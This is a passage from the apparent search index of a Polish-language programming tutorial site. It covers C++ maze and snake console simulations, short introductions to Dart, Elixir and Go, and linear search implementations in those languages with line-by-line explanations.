sciany\n            {\n                robotW++; /// Przemieszczamy robota w lewo\n            }\n\n            break;\n        case 'q':\n            return 0;\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/simulations/robot-in-maze/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/Robot#main.cpp</p>"},{"location":"programming/c%2B%2B/simulations/robot-in-maze/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p> <p>Warning</p> <p>Pod systemem Linux zamiast polecenia cls u\u017cywamy polecenia clear do wyczyszczenia ekranu terminala.</p>"},{"location":"programming/c%2B%2B/simulations/simple-path-in-maze/","title":"Prosta \u015bcie\u017cka w labiryncie","text":"<p>Dany jest \"prosty\" labirynt, tzn. z jednym korytarzem bez rozga\u0142\u0119zie\u0144. Celem jest dotarcie z punktu startowego do ko\u0144cowego i policzenie ilo\u015bci wykonanych krok\u00f3w.</p>"},{"location":"programming/c%2B%2B/simulations/simple-path-in-maze/#specyfikacja","title":"Specyfikacja","text":"<p>Dane:</p> <ul> <li><code>n</code> - d\u0142ugo\u015b\u0107 boku labiryntu;</li> <li>labirynt o wymiarach <code>n x n</code> podany w formie znak\u00f3w <code>#</code> oraz spacji, gdzie <code>#</code> oznacza \u015bcian\u0119, a spacja pusty korytarz;</li> <li><code>(startW, startK)</code> - wsp\u00f3\u0142rz\u0119dne punktu startowego</li> <li><code>(stopW, stopK)</code> - wsp\u00f3\u0142rz\u0119dne punktu docelowego</li> </ul> <p>Wynik:</p> <ul> <li>D\u0142ugo\u015b\u0107 korytarza z punktu startowego do punktu docelowego, czyli ilo\u015b\u0107 krok\u00f3w, kt\u00f3re trzeba wykona\u0107.</li> </ul>"},{"location":"programming/c%2B%2B/simulations/simple-path-in-maze/#opis-pomysu","title":"Opis pomys\u0142u","text":"<p>Komputer zostawia za sob\u0105 \"\u015blady\", odznaczaj\u0105c miejsca w labiryncie, kt\u00f3re ju\u017c odwiedzi\u0142. W ka\u017cdym kroku algorytmu komputer porusza si\u0119 w kierunku, w kt\u00f3rym znajduje si\u0119 pusty, nie oznaczony jeszcze korytarz.</p> <p>Je\u017celi dotrzemy do \u015blepego zau\u0142ka i nie mo\u017cemy wykona\u0107 kolejnego ruchu, oznacza to, \u017ce poszli\u015bmy na pocz\u0105tku w z\u0142ym kierunku i miejsce docelowe znajduje si\u0119 z drugiej strony. Dlatego \"przeskakujemy\" na pozycj\u0119 startow\u0105 i kontynuujemy przechodzenie przez labirynt zgodnie z opisan\u0105 wy\u017cej metod\u0105, pami\u0119taj\u0105c. by wyzerowa\u0107 licznik krok\u00f3w.</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;cstdlib&gt;\n#include &lt;windows.h&gt;\n\nusing namespace std;\n\nint main() {\n    int n = 10; /// Labirynt ma wymiar n x n\n    string labirynt[10];\n\n    labirynt[0] = \"##########\";\n    labirynt[1] = \"#        #\";\n    labirynt[2] = \"######## #\";\n    labirynt[3] = \"#      # #\";\n    labirynt[4] = \"# #### # #\";\n    labirynt[5] = \"# # ## # #\";\n    labirynt[6] = \"# #    # #\";\n    labirynt[7] = \"# ###### #\";\n    labirynt[8] = \"#        #\";\n    labirynt[9] = \"##########\";\n\n    int startK = 6; /// Kolumna\n    int startW = 1; /// Wiersz\n\n    int stopK = 3; /// Kolumna\n    int stopW = 5; /// Wiersz\n\n    /// Zmienne do pozycji komputera\n    int pozycjaK;\n    int pozycjaW;\n\n    /// Zapamietujemy, ile wykonalismy ruchow\n    int ileRuchow = 0;\n\n    /// Na poczatku komputer jest w miejscu start\n    pozycjaK = startK;\n    pozycjaW = startW;\n\n    /// Dopoki nie jestesmy w miejscu stop\n    while(pozycjaK != stopK || pozycjaW != stopW) {\n        /// Jezeli pole z lewej strony jest puste\n        if(labirynt[pozycjaW][pozycjaK - 1] == ' ') {\n            /// Wykonujemy ruch\n            labirynt[pozycjaW][pozycjaK] = '.'; /// Oznaczamy obecne miejsce jako odwiedzone\n            pozycjaK--; /// Poruszamy sie w lewo\n            ileRuchow++; /// Zwiekszamy licznik krokow\n        } else if(labirynt[pozycjaW][pozycjaK + 1] == ' ') {\n            labirynt[pozycjaW][pozycjaK] = '.';\n            pozycjaK++;\n            ileRuchow++;\n        } else if(labirynt[pozycjaW - 1][pozycjaK] == ' ') {\n            labirynt[pozycjaW][pozycjaK] = '.';\n            pozycjaW--;\n            ileRuchow++;\n        } else if(labirynt[pozycjaW + 1][pozycjaK] == ' ') {\n            labirynt[pozycjaW][pozycjaK] = '.';\n            pozycjaW++;\n            ileRuchow++;\n        } else {\n            /// Nie ma dozwolonego ruchu, wiec wracamy na poczatek\n            pozycjaK = startK;\n            pozycjaW = startW;\n            ileRuchow = 0;\n        }\n\n        /// Czyscimy ekran konsoli\n        system(\"cls\");\n\n        /// Wyswietlamy labirynt na ekranie\n        for(int w = 0; w &lt; n; w++)\n        {\n            for(int k = 0; k &lt; n; k++)\n            {\n                /// Jezeli w i k sa pozycjami robota, to wypisz @\n                /// W przeciwnym przypadku wypisz znak z labiryntu\n                if(w == pozycjaW &amp;&amp; k == pozycjaK)\n                {\n                    cout &lt;&lt; \"@\";\n                }\n                else\n                {\n                    cout &lt;&lt; labirynt[w][k];\n                }\n            }\n\n            cout &lt;&lt; endl;\n        }\n        cout &lt;&lt; \"Liczba ruchow: \" &lt;&lt; ileRuchow &lt;&lt; endl;\n\n        /// Czekamy chwile, np. 1 sekunde\n        Sleep(1000);\n    }\n\n    cout &lt;&lt; \"Liczba ruchow: \" &lt;&lt; ileRuchow &lt;&lt; endl;\n    //cout &lt;&lt; \"Spacja: \" &lt;&lt; int(' ') &lt;&lt; endl;\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/simulations/simple-path-in-maze/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/SimplePath#main.cpp</p>"},{"location":"programming/c%2B%2B/simulations/simple-path-in-maze/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p> <p>Warning</p> <p>Pod systemem Linux zamiast polecenia cls u\u017cywamy polecenia clear do wyczyszczenia ekranu terminala.</p> <p>Warning</p> <p>Pod systemem Linux polecenie Sleep nale\u017cy zast\u0105pi\u0107 poleceniem usleep, kt\u00f3re jako parametr przyjmuje mikrosekundy, a nie milisekundy. Trzeba tak\u017ce zmieni\u0107 bibliotek\u0119 \"windows.h\" na \"unistd.h\".</p>"},{"location":"programming/c%2B%2B/simulations/snake/","title":"W\u0119\u017cyk","text":"<p>Prosta symulacja, w kt\u00f3rej znak <code>#</code> porusza si\u0119 w formie \"w\u0119\u017cyka\" po ekranie konsoli - od lewej do prawej i od prawej do lewej.</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;cstdlib&gt;\n\nusing namespace std;\n\nint main()\n{\n    for(int i = 0; i &lt; 10; i++)\n    {\n        if(i% 2 == 0)\n        {\n            for(int j = 0; j &lt; 50; j++)\n            {\n                for(int i2 = 0; i2 &lt; 10; i2++)\n                {\n                    for(int j2 = 0; j2 &lt; 50; j2++)\n                    {\n                        if(i2 == i &amp;&amp; j2 == j)\n                        {\n                            cout &lt;&lt; \"#\";\n                        }\n                        else\n                        {\n                            cout &lt;&lt; \" \";\n                        }\n                    }\n\n                    cout &lt;&lt; endl;\n                }\n\n                system(\"cls\");\n            }\n        } else {\n            for(int j = 49; j &gt;= 0; j--)\n            {\n                for(int i2 = 0; i2 &lt; 10; i2++)\n                {\n                    for(int j2 = 0; j2 &lt; 50; j2++)\n                    {\n                        if(i2 == i &amp;&amp; j2 == j)\n                        {\n                            cout &lt;&lt; \"#\";\n                        }\n                        else\n                        {\n                            cout &lt;&lt; \" \";\n                        }\n                    }\n\n                    cout &lt;&lt; endl;\n                }\n\n                system(\"cls\");\n            }\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/simulations/snake/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/Snake#main.cpp</p>"},{"location":"programming/c%2B%2B/simulations/snake/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p> <p>Warning</p> <p>Pod systemem Linux zamiast polecenia cls u\u017cywamy polecenia clear do wyczyszczenia ekranu terminala.</p>"},{"location":"programming/dart/","title":"Dart","text":"<p>Dart to j\u0119zyk programowania og\u00f3lnego przeznaczenia opracowany przez Google, kt\u00f3rego g\u0142\u00f3wnym celem jest umo\u017cliwienie tworzenia aplikacji na r\u00f3\u017cne platformy. J\u0119zyk ten jest znany przede wszystkim jako j\u0119zyk programowania u\u017cywany we frameworku Flutter do tworzenia interfejs\u00f3w u\u017cytkownika w aplikacjach mobilnych.</p> <p>Oficjalna strona j\u0119zyka Dart</p>"},{"location":"programming/dart/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Statyczna typizacja: Dart jest j\u0119zykiem statycznie typowanym, co pomaga w zapewnieniu wi\u0119kszej poprawno\u015bci kodu.</p> </li> <li> <p>Wsparcie dla wielu paradygmat\u00f3w programowania: Dart obs\u0142uguje zar\u00f3wno programowanie proceduralne, jak i obiektowe, a tak\u017ce posiada elementy programowania funkcyjnego.</p> </li> <li> <p>Wygodne programowanie asynchroniczne: Dart oferuje wbudowane mechanizmy do pracy z asynchronicznymi operacjami, takie jak \"Future\" i \"Stream\", a tak\u017ce s\u0142owo kluczowe async/await.</p> </li> <li> <p>Hot Reload: dzi\u0119ki integracji z Flutterem, Dart oferuje mo\u017cliwo\u015b\u0107 \"Hot Reload\", co oznacza, \u017ce programista mo\u017ce zobaczy\u0107 wprowadzone zmiany w kodzie natychmiast, bez konieczno\u015bci ponownego uruchamiania ca\u0142ej aplikacji.</p> </li> <li> <p>Kompilacja do JavaScriptu: Dart mo\u017ce by\u0107 kompilowany do JavaScriptu, co oznacza, \u017ce kod napisany w Dart mo\u017ce by\u0107 uruchamiany w przegl\u0105darkach internetowych.</p> </li> </ol> <p>Dart jest szczeg\u00f3lnie popularny w kontek\u015bcie tworzenia aplikacji mobilnych za pomoc\u0105 Fluttera, ale mo\u017ce by\u0107 r\u00f3wnie\u017c u\u017cywany do tworzenia aplikacji internetowych i serwerowych. Jego rosn\u0105ca popularno\u015b\u0107 wynika z ci\u0105g\u0142ych inwestycji ze strony Google, prostoty sk\u0142adni, a tak\u017ce wsparcia dla r\u00f3\u017cnych platform docelowych.</p>"},{"location":"programming/dart/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka Dart</p>"},{"location":"programming/dart/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"programming/dart/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/dart/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/dart/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/dart/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>bool linearSearch(List&lt;int&gt; array, int number) {\n    for(int element in array) {\n      if (element == number) {\n          return true;\n      }\n    }\n\n    return false;\n}\n\nvoid main() {\n    List&lt;int&gt; array = [4, 8, 1, 3, 8, 0, 2, 5, 2];\n    int number = 0;\n\n    bool result = linearSearch(array, number);\n\n    if (result) {\n        print(\"Liczba jest w tablicy\");\n    } else {\n        print(\"Liczby nie ma w tablicy\");\n    }\n}\n</code></pre>"},{"location":"programming/dart/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje dwa argumenty: list\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne elementy w li\u015bcie (linia 2). Dla ka\u017cdego elementu sprawdzamy, czy jest to poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to zwracamy informacj\u0119 o znalezieniu warto\u015bci w li\u015bcie (linia 4). Po przej\u015bciu przez wszystkie elementy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>false</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w li\u015bcie (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: list\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>result</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/dart/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/dart/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>int linearSearch(List&lt;int&gt; array, int number) {\n    for(int i = 0; i &lt; array.length; i++) {\n      if (array[i] == number) {\n          return i;\n      }\n    }\n\n    return -1;\n}\n\nvoid main() {\n    List&lt;int&gt; array = [4, 8, 1, 3, 8, 0, 2, 5, 2];\n    int number = 0;\n\n    int index = linearSearch(array, number);\n\n    if (index == -1) {\n        print(\"Liczby nie ma w tablicy\");\n    } else {\n        print(\"Liczba jest pod indeksem $index\");\n    }\n}\n</code></pre>"},{"location":"programming/dart/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje dwa argumenty: list\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w li\u015bcie od \\(0\\) do rozmiaru listy minus jeden (linia 2). Rozmiar listy pobieramy za pomoc\u0105 w\u0142asno\u015bci <code>length</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w li\u015bcie znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to zwracamy indeks tej warto\u015bci w li\u015bcie (linia 4). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>-1</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w li\u015bcie (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: list\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>index</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/dart/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/dart/algorithms/searching/linear-search/#implementacja_2","title":"Implementacja","text":"<pre><code>void linearSearch(List&lt;int&gt; array, int number) {\n    for(int i = 0; i &lt; array.length; i++) {\n      if (array[i] == number) {\n          print(i);\n      }\n    }\n}\n\nvoid main() {\n    List&lt;int&gt; array = [4, 8, 1, 3, 8, 0, 2, 5, 8];\n    int number = 8;\n\n    print(\"Indeksy, pod kt\u00f3rymi znajduje si\u0119 szukana liczba:\");\n\n    linearSearch(array, number);\n}\n</code></pre>"},{"location":"programming/dart/algorithms/searching/linear-search/#opis-implementacji_2","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) nie zwraca wyniku i przyjmuje dwa argumenty: list\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w li\u015bcie od \\(0\\) do rozmiaru listy minus jeden (linia 2). Rozmiar listy pobieramy za pomoc\u0105 w\u0142asno\u015bci <code>length</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w li\u015bcie znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to wypisujemy ten indeks (linia 4).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: list\u0119 (linia 10) oraz warto\u015b\u0107 poszukiwanego elementu (linia 11). Nast\u0119pnie wypisujemy stosowny komunikat (linia 13) i wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami (linia 14).</p>"},{"location":"programming/elixir/","title":"Elixir","text":"<p>Elixir to dynamiczny, funkcjonalny j\u0119zyk programowania przeznaczony do tworzenia skalowalnych i utrzymanych aplikacji. J\u0119zyk ten zosta\u0142 stworzony przez Jos\u00e9 Valima, jednego z g\u0142\u00f3wnych programist\u00f3w frameworku Ruby on Rails, z my\u015bl\u0105 o poprawie niekt\u00f3rych brak\u00f3w i ogranicze\u0144 Ruby. Elixir dzia\u0142a na maszynie wirtualnej Erlanga, dzi\u0119ki czemu zapewnia pe\u0142ne wykorzystanie mo\u017cliwo\u015bci j\u0119zyka Erlang, takie jak obs\u0142uga wielu proces\u00f3w i odporno\u015b\u0107 na b\u0142\u0119dy, ale jednocze\u015bnie oferuje bardziej nowoczesn\u0105 i przyjazn\u0105 sk\u0142adni\u0119.</p> <p> Elixir</p>"},{"location":"programming/elixir/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Funkcjonalno\u015b\u0107: Elixir jest j\u0119zykiem programowania funkcyjnym, co oznacza, \u017ce skupia si\u0119 na funkcjach i ich wynikach, a nie na danych i ich stanach.</p> </li> <li> <p>Skalowalno\u015b\u0107 i odporno\u015b\u0107 na b\u0142\u0119dy: Dzi\u0119ki dzia\u0142aniu na maszynie wirtualnej Erlanga, Elixir dziedziczy jej cechy, takie jak mo\u017cliwo\u015b\u0107 r\u00f3wnoczesnego przetwarzania wielu zada\u0144 i odporno\u015b\u0107 na b\u0142\u0119dy. To sprawia, \u017ce Elixir jest idealnym wyborem dla aplikacji, kt\u00f3re musz\u0105 by\u0107 niezawodne i szybko reagowa\u0107 na r\u00f3\u017cne sytuacje.</p> </li> <li> <p>Meta-programowanie: Elixir oferuje zaawansowane mo\u017cliwo\u015bci metaprogramowania, kt\u00f3re pozwalaj\u0105 programistom na tworzenie w\u0142asnych domen i specyficznych j\u0119zyk\u00f3w programowania (DSLs).</p> </li> <li> <p>Wbudowany support dla narz\u0119dzi: Elixir ma wbudowane narz\u0119dzia do testowania, tworzenia dokumentacji i zarz\u0105dzania zale\u017cno\u015bciami, co czyni go wygodnym w u\u017cyciu.</p> </li> <li> <p>Sk\u0142adnia: Sk\u0142adnia Elixira jest prosta i czytelna, co u\u0142atwia pisanie i czytanie kodu.</p> </li> </ol> <p>Elixir jest szczeg\u00f3lnie polecany dla aplikacji, kt\u00f3re wymagaj\u0105 du\u017cej skalowalno\u015bci i niezawodno\u015bci, takich jak systemy telekomunikacyjne, bazy danych czy sieciowe systemy operacyjne. Ponadto, dzi\u0119ki wsparciu dla metaprogramowania i tworzenia DSLs, Elixir jest r\u00f3wnie\u017c cz\u0119sto wybierany do tworzenia specyficznych aplikacji biznesowych i webowych.</p>"},{"location":"programming/elixir/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/elixir/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/elixir/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/elixir/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>defmodule Search do\n    def linear(array, number) do\n        if (length array) == 0 do\n            false\n        else \n            if hd(array) == number do\n                true\n            else\n                linear(tl(array), number)\n            end\n        end\n    end\nend\n\narray = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0]\nnumber = 7\n\nresult = Search.linear(array, number)\n\nif result do\n    IO.puts \"Liczba jest w tablicy\"\nelse\n    IO.puts \"Liczby nie ma w tablicy\"\nend\n</code></pre>"},{"location":"programming/elixir/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>linear</code> w module <code>Search</code> (linie 1 i 2) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje dwa argumenty: list\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Je\u017celi lista jest pusta to funkcja zwraca warto\u015b\u0107 <code>false</code> informuj\u0105c\u0105 o tym, \u017ce poszukiwanego elementu nie znaleziono na li\u015bcie (linie 3 i 4). Jest to tzw. warunek stopu rekurencji. Je\u017celi w li\u015bcie pozosta\u0142y jeszcze jakie\u015b elementy do sprawdzenia, to sprawdzamy, czy pierwszy element listy (pobrany za pomoc\u0105 funkcji <code>hd</code>) jest poszukiwan\u0105 warto\u015bci\u0105 (linia 6). Je\u017celi tak, to funkcja zwraca wynik <code>true</code> (linia 7). W przeciwnym przypadku wywo\u0142ujemy rekurencyjnie funkcj\u0119 <code>linear</code>, jako argumenty przekazuj\u0105c list\u0119 bez pierwszego elementu (do tego u\u017cywamy funkcji <code>tl</code>), oraz warto\u015b\u0107 poszukiwanego elementu.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: list\u0119 (linia 16) oraz warto\u015b\u0107 poszukiwanego elementu (linia 17). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linear</code> z modu\u0142u <code>Search</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>result</code> (linia 19). W zale\u017cno\u015bci od wyniku (linia 21) wypisujemy odpowiedni komunikat (linie 22 i 24).</p>"},{"location":"programming/elixir/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/elixir/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>defmodule Search do\n    def linear(array, number, index) do\n        if (length array) == 0 do\n            -1\n        else \n            if hd(array) == number do\n                index\n            else\n                linear(tl(array), number, index + 1)\n            end\n        end\n    end\nend\n\narray = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0]\nnumber = 10\n\nindex = Search.linear(array, number, 0)\n\nif index == -1 do\n    IO.puts \"Liczby nie ma w tablicy\"\nelse\n    IO.puts \"Liczba jest pod indeksem #{index}\"\nend\n</code></pre>"},{"location":"programming/elixir/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>linear</code> w module <code>Search</code> (linie 1 i 2) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje trzy argumenty: list\u0119 do przeszukania, warto\u015b\u0107 poszukiwanego elementu oraz numer obecnie sprawdzanego indeksu. Je\u017celi lista jest pusta to funkcja zwraca warto\u015b\u0107 <code>-1</code> informuj\u0105c\u0105 o tym, \u017ce poszukiwanego elementu nie znaleziono na li\u015bcie (linie 3 i 4). Jest to tzw. warunek stopu rekurencji. Je\u017celi w li\u015bcie pozosta\u0142y jeszcze jakie\u015b elementy do sprawdzenia, to sprawdzamy, czy pierwszy element listy (pobrany za pomoc\u0105 funkcji <code>hd</code>) jest poszukiwan\u0105 warto\u015bci\u0105 (linia 6). Je\u017celi tak, to funkcja zwraca jako wynik warto\u015b\u0107 <code>index</code> (linia 7). W przeciwnym przypadku wywo\u0142ujemy rekurencyjnie funkcj\u0119 <code>linear</code>, jako argumenty przekazuj\u0105c list\u0119 bez pierwszego elementu (do tego u\u017cywamy funkcji <code>tl</code>), warto\u015b\u0107 poszukiwanego elementu oraz indeks zwi\u0119kszony o jeden.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: list\u0119 (linia 16) oraz warto\u015b\u0107 poszukiwanego elementu (linia 17). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linear</code> z modu\u0142u <code>Search</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>index</code> (linia 19). W zale\u017cno\u015bci od wyniku (linia 21) wypisujemy odpowiedni komunikat (linie 22 i 24).</p>"},{"location":"programming/go/","title":"Go","text":"<p>Go, cz\u0119sto nazywane Golang, to statycznie typowany, skompilowany j\u0119zyk programowania stworzony przez Roberta Griesemera, Roba Pike'a i Kena Thompsona w Google. Zosta\u0142 zaprojektowany z my\u015bl\u0105 o prostocie i wydajno\u015bci, a tak\u017ce o \u0142atwo\u015bci utrzymania i skalowalno\u015bci kodu. Pierwsza stabilna wersja Go zosta\u0142a wydana w 2012 roku.</p> <p> Go</p>"},{"location":"programming/go/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Statyczne typowanie i kompilacja: Go jest j\u0119zykiem statycznie typowanym i skompilowanym, co oznacza, \u017ce typy s\u0105 sprawdzane podczas kompilacji, a nie podczas dzia\u0142ania programu, co zwi\u0119ksza wydajno\u015b\u0107 i bezpiecze\u0144stwo kodu.</p> </li> <li> <p>Prostota: Go zosta\u0142o zaprojektowane z my\u015bl\u0105 o prostocie i czytelno\u015bci kodu. Sk\u0142adnia jest prosta i minimalistyczna, co u\u0142atwia nauk\u0119 j\u0119zyka i utrzymanie kodu.</p> </li> <li> <p>Wsparcie dla wielow\u0105tkowo\u015bci: Go ma wbudowane wsparcie dla goroutines - lekkich w\u0105tk\u00f3w zarz\u0105dzanych przez Go runtime, co u\u0142atwia pisanie program\u00f3w wielow\u0105tkowych.</p> </li> <li> <p>Garbage collector: Go ma wbudowany garbage collector, kt\u00f3ry automatycznie zarz\u0105dza pami\u0119ci\u0105, co redukuje ryzyko b\u0142\u0119d\u00f3w zwi\u0105zanych z zarz\u0105dzaniem pami\u0119ci\u0105.</p> </li> <li> <p>Bogata standardowa biblioteka: Go ma bogat\u0105 standardow\u0105 bibliotek\u0119, kt\u00f3ra zapewnia wiele przydatnych funkcji, takich jak obs\u0142uga sieci, obs\u0142uga plik\u00f3w, obs\u0142uga JSON i wiele innych.</p> </li> </ol> <p>Go jest szczeg\u00f3lnie popularny w\u015br\u00f3d developer\u00f3w backendowych i jest cz\u0119sto wykorzystywany do tworzenia aplikacji sieciowych, takich jak serwery API czy systemy rozproszone. Znajduje zastosowanie w wielu znacz\u0105cych projektach, w tym w systemach Kubernetes i Docker.</p>"},{"location":"programming/go/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"programming/go/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka Go</p>"},{"location":"programming/go/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/go/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/go/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/go/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>package main\n\nimport \"fmt\"\n\ntype array []int\n\nfunc (arr array) linearSearch(number int) bool {\n    for i := 0; i &lt; len(arr); i++ {\n        if arr[i] == number {\n            return true\n        }\n    }\n\n    return false\n}\n\nfunc main() {\n    arr := array{8, 2, 9, 10, 5, 4, 2, 7, 18, 0}\n    number := 7\n\n    result := arr.linearSearch(number)\n\n    if result {\n        fmt.Println(\"Liczba jest w tablicy\")\n    } else {\n        fmt.Println(\"Liczby nie ma w tablicy\")\n    }\n}\n</code></pre>"},{"location":"programming/go/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 7) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i jest metod\u0105 przypisan\u0105 do tablicy przyjmuj\u0105c\u0105 jeden argumenty: warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do rozmiaru tablicy minus jeden (linia 8). Rozmiar tablicy pobieramy za pomoc\u0105 funkcji <code>len</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 9). Je\u017celi tak, to zwracamy informacj\u0119 o znalezieniu warto\u015bci w tablicy (linia 10). Po przej\u015bciu przez wszystkie elementy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>false</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 14).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 18) oraz warto\u015b\u0107 poszukiwanego elementu (linia 19). Nast\u0119pnie wywo\u0142ujemy metod\u0119 <code>linearSearch</code> na tablicy z wcze\u015bniej przygotowanym parametrem i jej wynik zapisujemy w nowej zmiennej <code>result</code> (linia 21). W zale\u017cno\u015bci od wyniku (linia 23) wypisujemy odpowiedni komunikat (linie 24 i 26).</p>"},{"location":"programming/go/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/go/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>package main\n\nimport 